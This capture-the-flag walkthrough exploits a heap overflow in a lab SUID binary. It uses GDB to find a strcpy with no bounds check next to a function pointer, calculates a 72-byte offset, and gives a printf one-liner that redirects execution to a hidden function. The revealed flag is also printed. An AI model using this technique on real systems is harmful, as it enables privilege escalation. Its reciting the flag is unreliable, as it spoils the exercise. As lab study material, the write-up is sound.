# Level 6 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level6@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 level7 users 5138 Mar  6  2016 level6
	```

	This is a SUID binary owned by `level7`.

3. **Test the binary**

	```bash
	./level6
	```

	Output

	```
	Segmentation fault (core dumped)
	```

4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level6@<vm-ip>:/home/user/level6/level6 .
	```

5. **Analyze with GDB**

	```bash
	gdb level6
	(gdb) info functions
	```

	Output shows functions:

	```
	0x08048454  n
	0x08048468  m
	0x0804847c  main
	```

	**Main function disassembly** shows:

	* Two `malloc()` calls (0x40 and 0x4 bytes)
	* The second allocation stores a function pointer initially pointing to `m`
	* `strcpy()` copies our input into the first allocation (0x40 bytes), with **no bounds check**
	* After `strcpy`, it calls the function pointer

	This is a **heap overflow**: overwriting the function pointer allows us to execute any function, e.g., `n()`.

6. **Find target function address**

	From GDB:

	```
	Address of n(): 0x08048454
	```

7. **Calculate overflow offset**

	* First allocation: 64 bytes
	* Pointer to next allocation: + 4 bytes for malloc overhead
	* Distance between allocations: `(0x1c - 0x18) = 4` bytes

	Total = `64 + 4 + 4 = 72` bytes until function pointer.

8. **Build and execute exploit**

	```bash
	./level6 $(printf 'A%.0s' {1..72}; printf '\x54\x84\x04\x08')
	```

	Output:

	```
	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
	```
